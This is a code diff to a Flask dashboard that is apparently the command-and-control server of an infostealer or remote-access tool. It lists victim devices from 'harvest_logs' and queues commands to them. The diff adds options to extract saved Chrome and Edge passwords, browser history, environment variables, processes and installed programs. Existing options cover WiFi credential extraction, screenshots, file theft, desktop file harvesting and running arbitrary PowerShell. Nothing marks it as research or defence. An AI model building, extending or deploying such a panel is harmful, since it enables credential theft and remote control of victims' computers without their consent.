@@ -12,11 +12,10 @@ device_commands = {}
 def dashboard():
     # Build unique device list (not 'Unknown')
     devices = sorted({entry['device'] for entry in harvest_logs if entry.get('device') and entry['device'] != 'Unknown'})
-    # Device selection logic
     selected_device = request.values.get('device', devices[0] if devices else None)
 
-    # Handle command submission (POST)
-    if request.method == "POST" and selected_device and not request.path.startswith('/clear'):
+    # Handle command submission (POST, excluding reset form)
+    if request.method == 'POST' and selected_device and request.path == '/':
         cmd = request.form.get('cmd')
         arg = request.form.get('arg')
         device_commands.setdefault(selected_device, []).append((cmd, arg))
@@ -46,6 +45,14 @@ def dashboard():
                 <option value="wifi">Extract WiFi</option>
                 <option value="screenshot">Screenshot</option>
                 <option value="system_info">System Info</option>
+                <option value="installed_programs">Installed Programs</option>
+                <option value="running_processes">Running Processes</option>
+                <option value="running_services">Running Services</option>
+                <option value="environment_variables">Env Variables</option>
+                <option value="chrome_history">Chrome History</option>
+                <option value="edge_history">Edge History</option>
+                <option value="chrome_passwords">Chrome Passwords (Encrypted)</option>
+                <option value="edge_passwords">Edge Passwords (Encrypted)</option>
                 <option value="file">Send File</option>
                 <option value="custom">Run Custom PowerShell</option>
                 <option value="desktop_deep">Extract Desktop Files</option>
@@ -55,13 +62,13 @@ def dashboard():
             <input type="text" name="arg" placeholder="(Optional file path or command)">
             <button type="submit">Send Command</button>
         </form>
-        <table border=1>
+        <table border=1 style="margin-top:15px;">
           <tr><th>Time</th><th>Device</th><th>Log/Event</th></tr>
           {% for entry in device_logs %}
           <tr>
             <td>{{ entry.time }}</td>
             <td>{{ entry.device }}</td>
-            <td>{{ entry.log }}</td>
+            <td style="word-break:break-all;">{{ entry.log }}</td>
           </tr>
           {% endfor %}
         </table>
@@ -77,7 +84,7 @@ def dashboard():
 def clear_dashboard():
     harvest_logs.clear()
     device_commands.clear()
-    # Remove all files in upload folder
+    # Remove ALL files in uploads folder
     for fname in os.listdir(UPLOAD_FOLDER):
         os.remove(os.path.join(UPLOAD_FOLDER, fname))
     return render_template_string('''
@@ -103,7 +110,7 @@ def files(filename):
     try:
         return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)
     except Exception as e:
-        print(f"Error serving file {filename}: {e}")   # This prints to Render logs!
+        print(f"Error serving file {filename}: {e}")
         return f"Failed to serve file: {e}", 500
 
 @app.route('/command/<device>', methods=['GET'])
